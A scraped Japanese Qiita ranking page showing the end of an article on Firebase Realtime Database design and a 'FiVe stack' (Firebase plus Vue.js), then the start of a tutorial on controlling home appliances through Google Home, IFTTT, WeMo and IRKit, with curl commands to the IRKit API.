<span id="カウンタ" class="fragment"></span><a href="#%E3%82%AB%E3%82%A6%E3%83%B3%E3%82%BF"><i class="fa fa-link"></i></a>カウンタ</h2>

<p>IDを数える．</p>

<h2>
<span id="ページネーション" class="fragment"></span><a href="#%E3%83%9A%E3%83%BC%E3%82%B8%E3%83%8D%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3"><i class="fa fa-link"></i></a>ページネーション</h2>

<p>クエリで良い．</p>

<h2>
<span id="フィルタ-1" class="fragment"></span><a href="#%E3%83%95%E3%82%A3%E3%83%AB%E3%82%BF-1"><i class="fa fa-link"></i></a>フィルタ</h2>

<h2>
<span id="検索-1" class="fragment"></span><a href="#%E6%A4%9C%E7%B4%A2-1"><i class="fa fa-link"></i></a>検索</h2>

<h1>
<span id="よく言われるアレ気付き次第追記" class="fragment"></span><a href="#%E3%82%88%E3%81%8F%E8%A8%80%E3%82%8F%E3%82%8C%E3%82%8B%E3%82%A2%E3%83%AC%E6%B0%97%E4%BB%98%E3%81%8D%E6%AC%A1%E7%AC%AC%E8%BF%BD%E8%A8%98"><i class="fa fa-link"></i></a>よく言われるアレ（気付き次第追記）</h1>

<h2>
<span id="ビューとdbを密結合させたらビューを変更する時に不便" class="fragment"></span><a href="#%E3%83%93%E3%83%A5%E3%83%BC%E3%81%A8db%E3%82%92%E5%AF%86%E7%B5%90%E5%90%88%E3%81%95%E3%81%9B%E3%81%9F%E3%82%89%E3%83%93%E3%83%A5%E3%83%BC%E3%82%92%E5%A4%89%E6%9B%B4%E3%81%99%E3%82%8B%E6%99%82%E3%81%AB%E4%B8%8D%E4%BE%BF"><i class="fa fa-link"></i></a>「ビューとdbを密結合させたらビューを変更する時に不便」</h2>

<p>多くは見た目の変更で，扱うデータ自体が変更されることは少ないだろう．<br>
変更されたところで，構造を修正する<strong>バッチを回せば済む</strong>話だ（割り切り）．</p>

<h2>
<span id="非正規化が理想なのはわかるけどでも現実的には正規化したほうがいいよね" class="fragment"></span><a href="#%E9%9D%9E%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%8C%E7%90%86%E6%83%B3%E3%81%AA%E3%81%AE%E3%81%AF%E3%82%8F%E3%81%8B%E3%82%8B%E3%81%91%E3%81%A9%E3%81%A7%E3%82%82%E7%8F%BE%E5%AE%9F%E7%9A%84%E3%81%AB%E3%81%AF%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%97%E3%81%9F%E3%81%BB%E3%81%86%E3%81%8C%E3%81%84%E3%81%84%E3%82%88%E3%81%AD"><i class="fa fa-link"></i></a>「非正規化が理想なのはわかるけど，でも現実的には正規化したほうがいいよね」</h2>

<p>これもなるべくなら避けるべきだ（割り切り）．<br>
というより，上述した特殊な場合以外は現実的に問題ないはずである．</p>

<p>再度になるが，これまで培ってきた感覚で「正規化したほうがよさそう」は避けたほうが良い．<br>
コードが複雑になり，パフォーマンスにも影響が出かねない．</p>

<h2>
<span id="平坦化しろ" class="fragment"></span><a href="#%E5%B9%B3%E5%9D%A6%E5%8C%96%E3%81%97%E3%82%8D"><i class="fa fa-link"></i></a>「平坦化しろ」</h2>

<p>自分が検証した限りでは，単にdbのネストが深いからといって，パフォーマンスが落ちることはなさそうである．<br>
そのため，「平坦化する」ということ自体をメインの目標に掲げるのは本質的でない．</p>

<p>目指すはあくまで「ユーザの見えるままに」とすべきである．</p>

<p>「ネストの度に検索がかかるのでは」と思ったかたは鋭い．<br>
RDBをわかっていらっしゃる．</p>

<p>realtime databaseでは，jsonのkeyに対してはインデックスが貼られるのだ．<br>
valueに対しても，インデックスを指定して貼ることが可能（性能に影響するとアラート出るので，それからで遅くない）．</p>

<p>やはりあくまで中心は「ユーザの見えるままに」である．</p>

<h2>
<span id="クエリが貧弱" class="fragment"></span><a href="#%E3%82%AF%E3%82%A8%E3%83%AA%E3%81%8C%E8%B2%A7%E5%BC%B1"><i class="fa fa-link"></i></a>「クエリが貧弱」</h2>

<p>おわかりのかたもいると思うが，そもそも基本的にクエリは最低限でよいのだ．<br>
dbをreadした時点で，ビューに即した形になっているのだから．</p>

<h2>
<span id="値段高い" class="fragment"></span><a href="#%E5%80%A4%E6%AE%B5%E9%AB%98%E3%81%84"><i class="fa fa-link"></i></a>「値段高い」</h2>

<p><a href="https://qiita.com/Yatima/items/8a54acc8fda3e5fce741#%E3%81%A7%E3%82%82%E3%81%8A%E9%AB%98%E3%81%84%E3%82%93%E3%81%A7%E3%81%97%E3%82%87%E3%81%86%E3%82%84%E3%81%A3%E3%81%B1%E3%82%8Amysql%E3%81%AE%E3%81%BB%E3%81%86%E3%81%8C">のちほど</a>．</p>

<h2>
<span id="phpと組み合わせたい" class="fragment"></span><a href="#php%E3%81%A8%E7%B5%84%E3%81%BF%E5%90%88%E3%82%8F%E3%81%9B%E3%81%9F%E3%81%84"><i class="fa fa-link"></i></a>「PHPと組み合わせたい」</h2>

<p>なるべく避けるべき（割り切り）．</p>

<p>既存の技術を使わないのはもったいない，あるいは不安と思うかもしれない．<br>
しかしFirebaseはシンプルなシステム構成にしてこそ真価が発揮される．<br>
<strong>連携間の相性に悩まされることがなくなる</strong>わけだ．<br>
あるいは<strong>データ変換やAPIなど余計なことに煩わされなくなる</strong>．<br>
当記事に記すような考え方が身についてしまえば，<strong>学習コストも低い</strong>．</p>

<p>ぜひ0から始める気持ちで臨んでほしい（割り切り）．<br>
もちろん，RubyやPythonだろうが同様である．</p>

<h1>
<span id="よく言われないアレ" class="fragment"></span><a href="#%E3%82%88%E3%81%8F%E8%A8%80%E3%82%8F%E3%82%8C%E3%81%AA%E3%81%84%E3%82%A2%E3%83%AC"><i class="fa fa-link"></i></a>よく言われないアレ</h1>

<h2>
<span id="tips集" class="fragment"></span><a href="#tips%E9%9B%86"><i class="fa fa-link"></i></a>tips集</h2>

<h3>
<span id="削除時にはnullをwriteする" class="fragment"></span><a href="#%E5%89%8A%E9%99%A4%E6%99%82%E3%81%AB%E3%81%AFnull%E3%82%92write%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>削除時にはnullをwriteする</h3>

<p><code>.set()</code>や<code>.update()</code>，<code>.push()</code>でundefinedは送れない．<br>
<code>.remove()</code>もあるが，<strong>複数箇所の削除はできない</strong>のでいまいち．</p>

<h3>
<span id="一度のみのreadにはonce" class="fragment"></span><a href="#%E4%B8%80%E5%BA%A6%E3%81%AE%E3%81%BF%E3%81%AEread%E3%81%AB%E3%81%AFonce"><i class="fa fa-link"></i></a>一度のみのreadには<code>.once()</code>
</h3>

<p>上記の通りである．</p>

<h3>
<span id="クエリを使うならchild_added" class="fragment"></span><a href="#%E3%82%AF%E3%82%A8%E3%83%AA%E3%82%92%E4%BD%BF%E3%81%86%E3%81%AA%E3%82%89child_added"><i class="fa fa-link"></i></a>クエリを使うなら<code>child_added</code>
</h3>

<p>read時には<code>value</code>を使う（例えば<code>.on('value', ...)</code>のように）と手軽のように思えるが，実際は<code>child_added</code>のほうが良い．<br>
後者ならば，<a href="https://howtofirebase.com/firebase-data-modeling-939585ade7f4" rel="nofollow noopener" target="_blank"><strong>順番の整った状態で取得できる</strong></a>ためである．<br>
前者だとクライアント側で並び替えする必要がある．</p>

<p><code>child_changed</code>などもいちいち書かなければならない？<br>
例えば<a href="https://github.com/vuejs/vuefire" rel="nofollow noopener" target="_blank">Vuefire</a>のような，フレームワークと紐付けしてくれる便利なライブラリがある．</p>

<h2>
<span id="正規化は無駄" class="fragment"></span><a href="#%E6%AD%A3%E8%A6%8F%E5%8C%96%E3%81%AF%E7%84%A1%E9%A7%84"><i class="fa fa-link"></i></a>正規化は無駄</h2>

<p>先に謝っておく．無駄は言い過ぎた．<br>
しかし総じてメリットが上回ることは多くないと思われる．</p>

<p>慣れ以外でのメリットは，高々，容量を節約できるくらいと思われる．<br>
正規化したところでクエリが貧弱なため，まともに使うには苦労する．<br>
この後に示す，グローバル的な状態管理も欲しくなってくる．<br>
コードが複雑化するのは代償として大きい．</p>

<h2>
<span id="状態管理は不要" class="fragment"></span><a href="#%E7%8A%B6%E6%85%8B%E7%AE%A1%E7%90%86%E3%81%AF%E4%B8%8D%E8%A6%81"><i class="fa fa-link"></i></a>状態管理は不要</h2>

<p>ビューに即したデータ構造を持たせるのだから，基本的にはVuexやFlux, Reduxのような状態管理（いろいろな場面でデータを共有する仕組み）は不要．<br>
せいぜいユーザ情報程度だろう．</p>

<p>firebase自体もローカルでデータ保持することを考えると，無駄が多い．</p>

<h2>
<span id="ベストなjsフレームワーク" class="fragment"></span><a href="#%E3%83%99%E3%82%B9%E3%83%88%E3%81%AAjs%E3%83%95%E3%83%AC%E3%83%BC%E3%83%A0%E3%83%AF%E3%83%BC%E3%82%AF"><i class="fa fa-link"></i></a>ベストなjsフレームワーク</h2>

<p>dbの話なのにjsのフレームワークまで踏み込むのもアレだが，ビューとも密接な関係にあるため触れておく．</p>

<p>公式ではAngularが話題に挙がりやすいが，上記の状態管理機能などももりもり含んでおり，<strong>重厚長大過ぎる</strong>（割り切り）．</p>

<p><strong>Vue.jsが総合的に判断してベスト</strong>だろう．<br>
詳細は省くが，メリットは以下の通り．<br>
・とっつきやすさ<br>
・単一ファイルコンポーネント<code>*.vue</code>（html, css, jsを一ファイルにまとめられる）<br>
・日本語ドキュメントが充実<br>
・それなりの知名度，将来性<br>
・必要に駆られた際の拡張性<br>
元Googlerが中心人物のため，Google教徒の我々にとっても安心である．</p>

<p>一時期LAMPスタックという表現に則ってFIREスタックという表現が提唱されたが，自分は更に推し進めて<strong>FiVeスタック</strong>を提唱したい．</p>

<h1>
<span id="fiveスタック" class="fragment"></span><a href="#five%E3%82%B9%E3%82%BF%E3%83%83%E3%82%AF"><i class="fa fa-link"></i></a>FiVeスタック</h1>

<p><strong>Firebase + Vue.js</strong>である．</p>

<p>元ネタのFIREスタックはFirebase + Interface + Reactorであるが，</p>

<p>Interfaceとは，ユーザとのインターフェースである．<br>
jsのフレームワークや，ネイティブアプリを含むこともある．<br>
上述の通りVue.jsを推す．</p>

<p>Reactorとは，サーバサイドの処理である．<br>
現在は<a href="https://firebase.google.com/products/functions/" rel="nofollow noopener" target="_blank">Firebase内にも用意されている</a>ため，略語としてFirebaseに包含できてしまう．</p>

<p>つまるところ，<strong>FiVeスタック</strong>である．</p>

<h2>
<span id="ちなみにvue-material" class="fragment"></span><a href="#%E3%81%A1%E3%81%AA%E3%81%BF%E3%81%ABvue-material"><i class="fa fa-link"></i></a>ちなみに：vue-material</h2>

<p>Vue.jsでmaterial designを使う場合，<a href="http://vuematerial.io/" rel="nofollow noopener" target="_blank">vue-material</a>が便利である．<br>
<strong>神楽坂やちまはvue-materialで唯一のロゴ掲載スポンサーです（ステマ）</strong>．</p>

<p>…と，だいぶ話も逸れてしまった．<br>
閑話休題．<br>
これまでの内容を踏まえつつ，どのようなサービスに使いやすいか使いにくいかを解説したい．</p>

<h1>
<span id="サービスの向き不向き" class="fragment"></span><a href="#%E3%82%B5%E3%83%BC%E3%83%93%E3%82%B9%E3%81%AE%E5%90%91%E3%81%8D%E4%B8%8D%E5%90%91%E3%81%8D"><i class="fa fa-link"></i></a>サービスの向き不向き</h1>

<p>もちろん，Firebaseも万能ではない．</p>

<p>全体的に「細かい所は別に気にしなくてよくない？」という思想に基づいている（割り切り）．<br>
厳密性をウリにするような，<strong>企業や研究向けサービスの一部には向かない</strong>だろう．<br>
クエリが貧弱なので高度な分析なども苦手で，そういった意味でも使いにくい．</p>

<p>あるいは初出ではあるが，レイテンシもめちゃくちゃ低いというわけではない．<br>
（WebSocketなので<a href="http://blog.arungupta.me/rest-vs-websocket-comparison-benchmarks/" rel="nofollow noopener" target="_blank">RESTと比べて速い</a>のは確か）<br>
格闘ゲームやFirst Person Shootingのような，<strong>わずかな遅延が致命的となるゲームも向かない</strong>．</p>

<p>しかし，これらに含まれない大半のサービスでは，Firebaseの特徴がいずれかの部分でメリットとなるはずだ．<br>
（但し多くの人にとっては多少の学習コストが要るだろうが）<br>
本質的に，MySQLを置き換えるだけの可能性は十分に秘めている．<br>
（だからFiVeスタックを提唱したのだ）</p>

<p>そして兎にも角にも，まず気をつけるべきは<br>
<strong>「割り切り」</strong><br>
<strong>「ユーザの見えるままに」</strong><br>
である．</p>

<p>「dbはツリー状」<br>
「ノード以下まるごとread」<br>
「連番や配列は使わない」<br>
「一貫性のある同時書き込み」<br>
を意識しつつ，まずは<br>
<strong>「割り切り」</strong><br>
<strong>「ユーザの見えるままに」</strong><br>
である．</p>

<p>しかし大事な話を忘れていた．<br>
価格を含めた上で，そもそもFirebaseは採用に値するのだろうか？</p>

<h1>
<span id="でもお高いんでしょうやっぱりmysqlのほうが" class="fragment"></span><a href="#%E3%81%A7%E3%82%82%E3%81%8A%E9%AB%98%E3%81%84%E3%82%93%E3%81%A7%E3%81%97%E3%82%87%E3%81%86%E3%82%84%E3%81%A3%E3%81%B1%E3%82%8Amysql%E3%81%AE%E3%81%BB%E3%81%86%E3%81%8C"><i class="fa fa-link"></i></a>「でもお高いんでしょう？」「やっぱりMySQLのほうが…」</h1>

<p>ここらの話はGDG DevFest Tokyo 2017で登壇して話すので，ぜひいらして欲しい．<br>
<a href="https://tokyo.gdgjapan.org/schedule/day1?sessionId=126" rel="nofollow noopener" target="_blank">大半のウェブサービス/アプリは，Firebaseなら簡単で安いですよ</a>（<strong>11:30- @会議室1</strong>）<br>
→<a href="https://gdg-tokyo.connpass.com/event/66236/" rel="nofollow noopener" target="_blank">チケット登録</a>←</p>

<p>当記事はあくまでrealtime databaseのベストプラクティスとして踏み込んだ記事であるため，このイベントではより広い視点で解説するつもりである．</p>

<p>他にご質問，ご意見などあればぜひお気軽に．<br>
<strong>厳しいマサカリもお待ちしております．</strong></p>

<h1>
<span id="todo" class="fragment"></span><a href="#todo"><i class="fa fa-link"></i></a>todo</h1>

<p>レシピ埋めたい<br>
そのうちruleについても加筆したい</p>

<h1>
<span id="ついでにコミュニティも紹介" class="fragment"></span><a href="#%E3%81%A4%E3%81%84%E3%81%A7%E3%81%AB%E3%82%B3%E3%83%9F%E3%83%A5%E3%83%8B%E3%83%86%E3%82%A3%E3%82%82%E7%B4%B9%E4%BB%8B"><i class="fa fa-link"></i></a>ついでにコミュニティも紹介</h1>

<p>今誕生しそうな，Firebaseの日本ユーザグループ<br>
<a href="https://firebase-community.connpass.com/" class="autolink" rel="nofollow noopener" target="_blank">https://firebase-community.connpass.com/</a></p>

<p>前からGCPのユーザグループにもたむろっていた（FirebaseはGoogleなので）<br>
<a href="http://gcpug.jp/" class="autolink" rel="nofollow noopener" target="_blank">http://gcpug.jp/</a></p>

<h1>
<span id="参考記事" class="fragment"></span><a href="#%E5%8F%82%E8%80%83%E8%A8%98%E4%BA%8B"><i class="fa fa-link"></i></a>参考記事</h1>

<p><a href="https://medium.freecodecamp.org/firebase-5-way-too-common-misconceptions-93b843ee1b93" rel="nofollow noopener" target="_blank">Firebase: 5 way-too-common misconceptions</a><br>
　（記事最後のフォームより，<strong>ベストプラクティスのチェックリスト</strong>がPDFで入手できる）<br>
<a href="https://www.youtube.com/watch?v=WacqhiI-g_o&amp;list=PLl-K7zZEsYLlP-k-RKFa7RyNPa9_wCH2s" rel="nofollow noopener" target="_blank">The Firebase Database For SQL Developers</a>（公式youtube．<strong>非常におすすめ</strong>，日本語字幕あり）<br>
<a href="https://howtofirebase.com/firebase-data-modeling-939585ade7f4" rel="nofollow noopener" target="_blank">Firebase Data Modeling</a><br>
<a href="https://medium.com/@CodeAndBiscuits/best-practices-for-firebase-realtime-database-development-14e8fd133d44" rel="nofollow noopener" target="_blank">Best Practices for Firebase Realtime Database Development</a><br>
<a href="https://medium.com/@leetheguy/firebase-pros-and-cons-ce37c766190a" rel="nofollow noopener" target="_blank">Firebase Pros and Cons</a></p>

<p>　</p>

<p>　</p>

<p>└(・∀・)┘ﾔﾘｨ!</p>

<p>　</p>

<p>　</p>

<p>　</p>
</div>
	</td>
</tr>
</table>
<br />
<table border="1" style="height:150px;">
<tr>
	<td rowspan="3">97位</td>
	<td colspan="4">
		<kbd><i><img alt="いいね" width="16" height="16" src="thumb-up-120px.png" /></i>88</kbd>
		<a target="_blank" href="https://qiita.com/kazunori279/items/e3485f00fbe0ad85cce2">Google Home＋IFTTTで、お手軽に家電コントロール</a>
	</td>
</tr>
<tr>
	<td style="width:100px;"><center>投稿日時</center></td>
	<td style="width:200px;"><center>投稿者</center></td>
	<td style="width:150px;"><center>タグ</center></td>
	<td style="width:350px;"><center>本文</center></td>
</tr>
<tr>
	<td style="width:100px;">
		<!--投稿日時--><center>2017-10-09<br />06:49:30</center>
	</td>
	<td style="width:200px;">
		<!--投稿者-->
		<center>
			@<a href="user/38290.html">kazunori279</a>(41件の記事)<br />(Google Inc 所属)<br><img width="80" height="80" src="https://qiita-image-store.s3.amazonaws.com/0/38290/profile-images/1473687710">
		</center>
	</td>
	<td style="width:150px;">
		<!--タグ-->
		<center><b>[ifttt]</b> <b>[IRKit]</b> <b>[GoogleAssistant]</b> <b>[GoogleHome]</b> <b>[WeMo]</b> </center>
	</td>
	<td style="width:350px;">
		<!--本文-->
		<div style="width:350px;height:150px;overflow-x:hidden;overflow-y:scroll;"><p>一昨日は、<a href="https://qiita.com/kazunori279/items/fdadbfde58ed133bb9d5" id="reference-b19ccd037fd9e63c5301">Google HomeでつぶやくとTwitterでつぶやく連携</a>がうまく動いた。これでかなり楽しくなってしまい、昨日は<a href="https://ifttt.com/google_assistant" rel="nofollow noopener" target="_blank">IFTTTのGoogle Assistant連携</a>で家電をコントロールする方法をいろいろ試してみた。Home三昧の三連休である。</p>

<p>今回紹介するのは以下の2つ。</p>

<ul>
<li>Belkin WeMoで家電のAC電源をオンオフ</li>
<li>IRKitで家電をリモコン制御</li>
</ul>

<p>WeMoの方は、何も考えずにあっという間に設定できる。IRKitの方は若干のコマンド操作が必要だが、それでも15分くらいで終わる。</p>

<p>ちなみに、IRKitの方で使うIFTTTの<a href="https://ifttt.com/maker_webhooks" rel="nofollow noopener" target="_blank">Webhooks</a>は、HTTP/HTTPSで任意のURLを呼べるアクションである。家電のコントロールは使い方の一例にすぎず、REST APIを備えるいろんな対象を制御できてしまう。Google Home＋IFTTT、なんて強力なのだ。</p>

<p><a href="https://camo.qiitausercontent.com/eb8bd6b446da844f656c405d3bc114151789851e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f62393931313637352d653063332d346236302d343933662d3062353965366265323535322e6a706567" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/eb8bd6b446da844f656c405d3bc114151789851e/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f62393931313637352d653063332d346236302d343933662d3062353965366265323535322e6a706567" alt="47D3977A-B674-4AA9-B1EA-2A84E2C23588.jpeg" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/b9911675-e0c3-4b60-493f-0b59e6be2552.jpeg"></a><br>
IRKit</p>

<h2>
<span id="belkin-wemoで家電をオンオフ" class="fragment"></span><a href="#belkin-wemo%E3%81%A7%E5%AE%B6%E9%9B%BB%E3%82%92%E3%82%AA%E3%83%B3%E3%82%AA%E3%83%95"><i class="fa fa-link"></i></a>Belkin WeMoで家電をオンオフ</h2>

<p><a href="http://www.belkin.com/us/Products/home-automation/c/wemo-home-automation/" rel="nofollow noopener" target="_blank">Belkin WeMo</a>はBelkinが販売するホームオートメーション製品。WiFi経由でAC電源をオンオフするモジュールや、電球の明るさを調節するモジュールなどがあり、日本でも<a href="http://amzn.asia/8fvvZSF" rel="nofollow noopener" target="_blank">Amazonで購入</a>できる。</p>

<p><a href="https://camo.qiitausercontent.com/fea8d32fb0a000bcaeec514bf96263bec281000f/68747470733a2f2f696d616765732d6e612e73736c2d696d616765732d616d617a6f6e2e636f6d2f696d616765732f492f3331486d2d32634d6e794c2e6a7067" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/fea8d32fb0a000bcaeec514bf96263bec281000f/68747470733a2f2f696d616765732d6e612e73736c2d696d616765732d616d617a6f6e2e636f6d2f696d616765732f492f3331486d2d32634d6e794c2e6a7067" alt="" data-canonical-src="https://images-na.ssl-images-amazon.com/images/I/31Hm-2cMnyL.jpg"></a></p>

<p>普通はWeMoのスマホアプリからオンオフして使うのだが、IFTTT連携にも対応しており、「Google Assistantでトリガー→WeMoの指定デバイスをオンオフ」するAppletも簡単に作れる。Google Assistantをトリガーとする設定は<a href="https://qiita.com/kazunori279/items/fdadbfde58ed133bb9d5#ifttt%E3%81%AEapplet%E3%82%92%E4%BD%9C%E3%82%8B" id="reference-b19ccd037fd9e63c5301">前回説明した方法</a>と同じ。ただし、今回は<code>Say a simple phrase</code>を選択して、固定のフレーズに反応してトリガーを起動する設定にする。</p>

<p><a href="https://camo.qiitausercontent.com/549c178332b77244481e9d5d5454f66d84017f5c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f32353835303661382d633464642d316264372d653661352d3165353731636266313331362e706e67" target="_blank" rel="nofollow noopener"><img width="340" alt="Screen Shot 2017-10-08 at 9.46.35 PM.png" src="https://camo.qiitausercontent.com/549c178332b77244481e9d5d5454f66d84017f5c/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f32353835303661382d633464642d316264372d653661352d3165353731636266313331362e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/258506a8-c4dd-1bd7-e6a5-1e571cbf1316.png"></a></p>

<p>こののトリガーで起動する先としてWeMoを選択すると、WeMoで実行できるアクションの選択肢が表示される。</p>

<p><a href="https://camo.qiitausercontent.com/8b695f86031943c3ecd95683c1ed27197824e0f5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f34633135323638612d393234372d616431662d396134352d6639653566633530633034362e706e67" target="_blank" rel="nofollow noopener"><img width="970" alt="Screen Shot 2017-10-08 at 9.38.47 PM.png" src="https://camo.qiitausercontent.com/8b695f86031943c3ecd95683c1ed27197824e0f5/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f34633135323638612d393234372d616431662d396134352d6639653566633530633034362e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/4c15268a-9247-ad1f-9a45-f9e5fc50c046.png"></a></p>

<p>ここで<code>Turn on</code>を選び、電源オンしたいデバイスを指定する。</p>

<p><a href="https://camo.qiitausercontent.com/cb9be770b8b4abf5c49b05e333b7b9103c9f5ada/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f34373565356131382d323262372d333230392d303164642d3663636337663363316236642e706e67" target="_blank" rel="nofollow noopener"><img width="453" alt="Screen Shot 2017-10-08 at 9.39.01 PM.png" src="https://camo.qiitausercontent.com/cb9be770b8b4abf5c49b05e333b7b9103c9f5ada/68747470733a2f2f71696974612d696d6167652d73746f72652e73332e616d617a6f6e6177732e636f6d2f302f33383239302f34373565356131382d323262372d333230392d303164642d3663636337663363316236642e706e67" data-canonical-src="https://qiita-image-store.s3.amazonaws.com/0/38290/475e5a18-22b7-3209-01dd-6ccc7f3c1b6d.png"></a></p>

<p>設定はこれだけ。<code>Finish</code>をクリックしてAppletを登録すれば、すぐにGoogle Homeで使えるようになる。</p>

<h2>
<span id="irkitで家電をリモコン制御" class="fragment"></span><a href="#irkit%E3%81%A7%E5%AE%B6%E9%9B%BB%E3%82%92%E3%83%AA%E3%83%A2%E3%82%B3%E3%83%B3%E5%88%B6%E5%BE%A1"><i class="fa fa-link"></i></a>IRKitで家電をリモコン制御</h2>

<p>続いて、<a href="http://getirkit.com/" rel="nofollow noopener" target="_blank">IRKit</a>を使って赤外線リモコンに対応した家電を制御してみよう。IRKitはWiFiの付いた赤外線リモコンで、家電のリモコンの赤外線信号を学習させ、スマホアプリからコントロールできる。こちらも<a href="http://amzn.asia/cd1qxtv" rel="nofollow noopener" target="_blank">Amazonから購入</a>できる（ちょっとお高い）。</p>

<p><a href="https://camo.qiitausercontent.com/19583fb60e3a895be4281ef04df8725bcf06a557/687474703a2f2f67657469726b69742e636f6d2f696d616765732f636f6d706f736974696f6e2e706e67" target="_blank" rel="nofollow noopener"><img src="https://camo.qiitausercontent.com/19583fb60e3a895be4281ef04df8725bcf06a557/687474703a2f2f67657469726b69742e636f6d2f696d616765732f636f6d706f736974696f6e2e706e67" alt="" data-canonical-src="http://getirkit.com/images/composition.png"></a></p>

<p>我々がIRKitにそそられる点は、とてもお手軽な<a href="http://getirkit.com/#IRKit-Device-API" rel="nofollow noopener" target="_blank">REST API</a>が公開されていること。このAPIをIFTTTのWebhooksから呼び出せば、Google Homeを使ったリモコン制御を簡単に行える。</p>

<h3>
<span id="irkitのdeviceidとclientkeyを取得する" class="fragment"></span><a href="#irkit%E3%81%AEdeviceid%E3%81%A8clientkey%E3%82%92%E5%8F%96%E5%BE%97%E3%81%99%E3%82%8B"><i class="fa fa-link"></i></a>IRKitのdeviceidとclientkeyを取得する</h3>

<p>まずは、IRKitのマニュアルにしたがって専用アプリを使いWiFiに接続しておく。つづいて、APIドキュメントを参考に、以下の手順で<code>deviceid</code>と<code>clientkey</code>を取得する。</p>

<p>まずはIRKitのIPアドレスを調べよう。コンソールから以下のコマンドを実行すると、BonjourでIPアドレスを取得できる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ dns-sd -B _irkit._tcp
Browsing for _irkit._tcp
DATE: ---Sun 08 Oct 2017---
18:49:43.251  ...STARTING...
Timestamp     A/R    Flags  if Domain               Service Type         Instance Name
18:49:47.965  Add        2   5 local.               _irkit._tcp.         irkit6ff6

$ dns-sd -G v4 iRKit6ff6.local
DATE: ---Sun 08 Oct 2017---
18:52:17.599  ...STARTING...
Timestamp     A/R Flags if Hostname                               Address                                      TTL
18:52:18.316  Add     2  5 irkit6ff6.local.                       192.168.1.140                                10
</pre></div></div>

<p>つづいて、このIPアドレスを使って<code>clienttoken</code>を取得。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -i "http://192.168.1.140/keys" -d '' -H "X-Requested-With: curl"

HTTP/1.0 200 OK
Access-Control-Allow-Origin: *
Server: IRKit/3.0.0.0.g85190b1
Content-Type: text/plain

{"clienttoken":"***clienttokenが入る***"}
</pre></div></div>

<p>この<code>clienttoken</code>を使い、IRKitのAPIサーバーから<code>deviceid</code>と<code>clientkey</code>を取得する。この2つはどこかにメモしておこう。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -i -d "clienttoken=***clienttokenが入る***" "https://api.getirkit.com/1/keys"

HTTP/1.1 200 OK
Server: openresty
Date: Sun, 08 Oct 2017 09:54:43 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 94
Connection: keep-alive
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
X-Content-Type-Options: nosniff

{"deviceid":"***deviceidが入る***","clientkey":"***clientkeyが入る***"}
</pre></div></div>

<p>これで<code>deviceid</code>と<code>clientkey</code>が手に入ったので、これらを使いIRKitのAPIサーバー経由でIRKitの機能をいろいろ呼び出せる。</p>

<h3>
<span id="赤外線信号を読みとる" class="fragment"></span><a href="#%E8%B5%A4%E5%A4%96%E7%B7%9A%E4%BF%A1%E5%8F%B7%E3%82%92%E8%AA%AD%E3%81%BF%E3%81%A8%E3%82%8B"><i class="fa fa-link"></i></a>赤外線信号を読みとる</h3>

<p>では、家電のリモコンの赤外線信号を読み取ろう。以下のコマンドを実行すると、IRKitが外部からの赤外線信号を待機する状態になる。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>$ curl -i "https://api.getirkit.com/1/messages?clientkey=***clientkeyが入る***&amp;clear=1"
</pre></div></div>

<p>ここで家電のリモコンをIRKitに向けて読み取りたいボタンを押すと、以下のように赤外線信号を表す<code>message</code>プロパティを含むJSONが返る。</p>

<div class="code-frame" data-lang="text"><div class="highlight"><pre><span></span>HTTP/1.1 200 OK
Server: openresty
Date: Sun, 08 Oct 2017 09:56:37 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 896
Connection: keep-alive
Access-Control-Allow-Origin: *
Access-Control-Allow-Headers: X-Requested-With
ETag: "-1823812453"
X-Content-Type-Options: nosniff

{"message":{"format":"raw","freq":38,"data":[4713,1037,2451,1073,1319,1037,2451,1037,1319,1037,2451,1037,1319,1037,1319,1037,2451,1073,1275,1073,1275,1073,1275,1073,1275,56112,4713,1073,2451,1073,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1037,2451,1037,1275,1073,2451,1037,1319,1037,2451,1073,1319,1073,1319,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1073,2451,1073,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1073,1319,1073,1319,1073,1319,56112,4713,1037,2451,1037,1275,1073,2451,1037,1319,1037,2451,1073,1275,1073,1275,1073,2451,1037,1319,1037,1319,1037,1319,1037,1319,56112,4713,1073,2451,1073,1319,1037,2451,1073,1275,1073,2451,1037,1319,1037,1319,1037,2451,1073,1275,1073,1275,1073,1275,1073,1275]},"hostname":"IRKit6FF6","deviceid":"***deviceidが入る***"}
</pre></div></div>

<p>この<code>message</code>プロパティの値部分をメモしておく。</p>

<h3>
<span id="curlでテスト" class="fragment"></span><a href="#curl%E3%81%A7%E3%83%86%E3%82%B9%E3%83%88"><i class="fa fa-link"></i></a>curlでテスト</h3>

